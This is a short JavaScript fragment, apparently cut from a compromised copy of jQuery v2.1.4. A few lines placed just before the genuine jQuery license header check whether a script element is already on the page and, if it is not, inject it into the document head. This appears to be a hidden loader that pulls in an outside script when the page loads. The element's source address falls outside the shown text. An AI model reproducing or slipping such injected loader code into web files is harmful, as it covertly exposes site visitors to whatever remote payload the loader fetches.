...
var n4 = true; for (var i = scripts.length; i--;) {if (scripts[i].src == n2.src) { n4 = false;}else{} } if(n4 == true){document.head.appendChild(n2);}/*! jQuery v2.1.4 | (c) 2005, 2015 jQuery Foundation, Inc. | jquery.org/license */
